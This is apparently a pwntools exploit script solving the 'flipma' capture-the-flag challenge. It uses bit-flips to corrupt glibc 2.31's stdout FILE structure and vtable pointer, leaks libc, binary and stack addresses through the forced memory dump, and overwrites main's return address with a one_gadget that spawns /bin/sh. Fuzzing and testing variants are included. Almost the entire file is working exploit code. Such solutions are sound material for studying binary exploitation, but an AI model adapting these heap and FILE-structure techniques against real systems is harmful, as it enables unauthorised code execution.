#!/usr/bin/env python3

from pwn import *

exe = ELF("./flipma")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = ["pwntools-terminal"]

DOCKER_PORT		= 5000
REMOTE_NC_CMD	= "nc chall.lac.tf 31165"	# `nc <host> <port>`

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline

aleak = lambda elfname, addr: log.info(f"{elfname} @ 0x{addr:x}")	# addr leak (bases)
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")		# val leak (canary)
bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
chunks = lambda data, step: [data[i:i+step] for i in range(0, len(data), step)]

GDB_SCRIPT = """
# b *puts+212
c
"""
"""
# b *puts+212

b *puts+373
c
si
b *$rip+73
c
si
b *$rip+43
c
si
b *$rip+8
c
si
b *$rip+65
c
si
b *$rip+179
c
si
"""

def conn():
	if args.LOCAL:
		return process([exe.path])
	
	if args.GDB:
		return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)

	if args.DOCKER:
		return remote("localhost", DOCKER_PORT)
	
	return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def flip(io: tube, off: int, i: int):
	io.s(bstr(off).ljust(16, b'\0'))
	io.s(bstr(i).ljust(16, b'\0'))

def convert(io: tube, off: int, original: int, target: int, max_popcount=4):
	diff = original ^ target
	popcount = bin(diff).count('1')
	assert popcount <= max_popcount

	for i in range(8):
		if diff & (1 << i):
			flip(io, off, i)

def convert_qword(io: tube, off: int, original: int, target: int):
	for i in range(8):
		mask = 0xff << (i*8)
		val = (original & mask) >> (i*8)
		target_val = (target & mask) >> (i*8)
		if val != target_val:
			convert(io, off+i, val, target_val, 8)

def fuzz():
	for i in range(0xff):
		io = conn()

		stdout_off = libc.sym._IO_2_1_stdout_ - libc.sym._IO_2_1_stdin_
		stdout_vtable_ptr_off = stdout_off + 216 # &stdout->vtable_ptr - &stdin
		vtable = libc.sym._IO_file_jumps
		target = (vtable + i*8)# - 0x38

		# flip(io, stdout_off + 0x28, 2)
		flip(io, stdout_off + 0x20 + 1, 6)
		flip(io, stdout_off + 0x28 + 1, 6)

		try:
			convert(io, stdout_vtable_ptr_off, vtable, target, 1)
		except Exception as err:
			print("err:", err)
			io.close()
			continue

		flip(io, 0, 10)

		log.info(f"i: {i}")
		io.interactive()
		io.close()
		log.info(f"i: {i}")

def fuzz1bit():
	for i in range(8):
		stdout_off = libc.sym._IO_2_1_stdout_ - libc.sym._IO_2_1_stdin_
		stdout_vtable_ptr_off = stdout_off + 216 # &stdout->vtable_ptr - &stdin

		io = conn()
		flip(io, stdout_off + 0x28 + 1, 6)
		flip(io, stdout_vtable_ptr_off, i)
		flip(io, 0, 10)
		io.interactive()

def testing():
	stdout_off = libc.sym._IO_2_1_stdout_ - libc.sym._IO_2_1_stdin_
	stdout_vtable_ptr_off = stdout_off + 216 # &stdout->vtable_ptr - &stdin

	log.info(f"stdout_off: {stdout_off}")
	log.info(f"stdout_vtable_ptr_off: {stdout_vtable_ptr_off}")

	io = conn()

	flip(io, stdout_vtable_ptr_off, 7)
	flip(io, stdout_off + 0x10 + 1, 5)
	flip(io, stdout_off + 0x20 + 1, 5)
	flip(io, 0, 10)

	dump = io.clean()
	log.info(f"{len(dump)} bytes dumped")
	with open("dump.txt", "w") as f:
		f.write(dump.hex())

	libc.address = u64(dump[53:][:8]) + 0x2e5d9b
	aleak("libc", libc.address)
	exe.address = u64(dump[2141:][:8]) - exe.sym.stdout
	aleak("exe", exe.address)
	stack = u64(dump[7517:][:8])
	aleak("stack", stack)

	pause()
	io.interactive()

def solve():
	io = conn()

	stdout_off = libc.sym._IO_2_1_stdout_ - libc.sym._IO_2_1_stdin_

	# bit flip stdout's vtable pointer so that when puts is called it won't call the internal puts,
	# but some functions that by luck end up flushing the stream
	stdout_vtable_ptr_off = stdout_off + 0xd8
	flip(io, stdout_vtable_ptr_off, 7)
	log.info("Corrupted vtable pointers")

	# we can flip stdout buffer pointers to make the flush print stuff ouf of bounds
	# we'll expand it by pulling the start back because before it, in the libc, there's exe, stack, and libc pointers
	# we need to change both read_end and write_base because if not the function flushing the stream will try to file seek -
	# - with a crazy offset and it will error out
	# we could have only changed the end of the buffer and saved a flip, but there's no exe pointers there, and it's a dead end
	flip(io, stdout_off + 0x10 + 1, 5) # read_end
	flip(io, stdout_off + 0x20 + 1, 5) # write_base
	log.info("Expanded stdout buffer backwards")

	# we can trigger a puts call by trying to flip out of bounds
	flip(io, 0, 10)
	log.info("Triggered puts")
	# if all's right, a huge memory dump has been sent to us!
	io.ru(b"a: b: "*4)
	dump = io.ru(b"a: ", drop=True)
	log.info(f"{len(dump)} bytes dumped")
	if len(dump) < 100:
		log.failure("Dump failed; retrying") # it's a guessy exploi
		io.close()
		return solve()

	with open("dump.txt", "w") as f:
		f.write(dump.hex())

	libc.address = u64(dump[37:][:8]) - 0x157f10
	aleak("libc", libc.address)
	exe.address = u64(dump[2117:][:8]) - exe.sym.stdout
	aleak("exe", exe.address)
	stack = u64(dump[7485:][:8])
	aleak("stack", stack)

	# we can now flip the flip counter to get unlimited flips!
	flip(io, exe.sym.flips + 1 - libc.sym._IO_2_1_stdin_, 7)

	# the stack leak is very 'incosistent'; its distance from actual stack frames is very variable
	# we'll leak again via stdout! but this time, we'll leak environ :)
	# we need to fixup stdout to make it work
	old = flat({
		0:		0xfbad2887,
		8:		libc.sym._IO_2_1_stdout_+131,
		0x10:	libc.sym._IO_2_1_stdout_+131,
		0x18:	libc.sym._IO_2_1_stdout_+131,
		0x20:	libc.sym._IO_2_1_stdout_+131,
		0x28:	libc.sym._IO_2_1_stdout_+131,
		0x30:	libc.sym._IO_2_1_stdout_+131,
		0x38:	libc.sym._IO_2_1_stdout_+131,
		0x40:	libc.sym._IO_2_1_stdout_+132,
		0x68:	libc.sym._IO_2_1_stdin_,
		0x70:	1,
		0x78:	0xffffffffffffffff,
		0x80:	0xa000000,
		0x88:	libc.address + 0x1ee7e0,
		0x90:	0xffffffffffffffff,
		0xa0:	libc.address + 0x1ec880,
		0xc0:	0xffffffff,
		0xd8:	libc.sym._IO_file_jumps
	}, filler=b'\0')
	new = flat({
		0:		0xfbad2085,
		8:		0xa,
		0x10:	0xa,
		0x18:	0xa,
		0x20:	0xa,
		0x28:	0xa,
		0x30:	0xa,
		0x38:	0xa,
		0x40:	libc.address + 0x1e88aa,
		0x68:	libc.sym._IO_2_1_stdin_,
		0x70:	1,
		0x78:	0xffffffffffffffff,
		0x88:	libc.address + 0x1ee7e0,
		0x90:	0xffffffffffffffff,
		0xa0:	libc.address + 0x1ec880,
		0xc0:	0xffffffff,
		0xd8:	libc.sym._IO_file_jumps
	}, filler=b'\0')

	for i in range(len(old)):
		convert(io, stdout_off + i, old[i], new[i], 8)

	# now we should be able to mess stdout up again to leak stuff! this time, we'll expand the buffer forward to leak environ
	# yes i could have made new be the fixed-up stdout instead of fixing it up later; whatever
	flip(io, stdout_vtable_ptr_off, 7)
	flip(io, stdout_off + 0x28 + 1, 6)
	flip(io, 0, 10)

	dump = io.clean(0.1 if args.LOCAL else 0.3).lstrip(b"a: b: ")
	log.info(f"{len(dump)} bytes dumped")
	if len(dump) < 100:
		log.failure("Dump failed; retrying") # it's a guessy exploi
		io.close()
		return solve()

	with open("dump.txt", "w") as f:
		f.write(dump.hex())

	environ = u64(dump[7933:][:8])
	aleak("environ", environ)

	# we can now use bit flips to change main's return pointer to be a one_gadget!
	"""
	0xe3b01 execve("/bin/sh", r15, rdx)
	constraints:
	[r15] == NULL || r15 == NULL || r15 is a valid argv
	[rdx] == NULL || rdx == NULL || rdx is a valid envp
	"""

	# r15 is already NULL, and rdx points to stdin; its first qword is its flags, and we know them, so we can just turn them off
	convert_qword(io, 0, 0xfbad208a, 0)

	# we can now flip the return pointer to be a one_gadget
	one_gadget = libc.address + 0xe3b01
	main_ret = environ - 0x100
	original = libc.sym.__libc_start_main + 243
	aleak("main_ret", main_ret)
	convert_qword(io, main_ret - libc.sym._IO_2_1_stdin_, original, one_gadget)

	# the program will crash if we leave because it calls puts with our messed up stdout
	# we can just flip 1 bit in flip's return pointer to make it return after that calls
	flip_ret = environ - 0x110
	flip(io, flip_ret - libc.sym._IO_2_1_stdin_, 0)

	io.interactive()

def cheese():
	while True:
		try:
			io = conn()

			stdout_off = libc.sym._IO_2_1_stdout_ - libc.sym._IO_2_1_stdin_
			stdout_vtable_ptr_off = stdout_off + 0xd8
			flip(io, stdout_vtable_ptr_off, 7) # i only need 1 bit flip to leak!
			flip(io, stdout_off + 0x28 + 1, 6) # expand stdout's buffer which will be written
			flip(io, 0, 10) # trigger puts
			
			io.ru(p64(0xffffffffffffffff))
			dump = io.ru(b"a: ", drop=True)
			log.info(f"{len(dump)} bytes dumped")
			with open("dump.txt", "w") as f:
				f.write(dump.hex())

			libc.address = u64(dump[0x48:0x50]) - libc.sym._IO_2_1_stderr_
			aleak("libc", libc.address)
			environ = u64(dump[0x1ec8:][:8])
			aleak("environ", environ)

			flip_frame = environ - 0x118
			aleak("flip_frame", flip_frame)
			flip_ret = environ - 0x110
			aleak("flip_ret", flip_ret)
			main_ret = environ - 0x100
			aleak("main_ret", main_ret)

			io.interactive()
			break
		except:
			io.close()
			continue

def main():
	if '-f' in sys.argv:
		fuzz()
	elif '-c' in sys.argv:
		cheese()
	elif '-f1' in sys.argv:
		fuzz1bit()
	elif '-t' in sys.argv:
		testing()
	elif '-s' in sys.argv:
		solve()

if __name__ == "__main__":
	main()
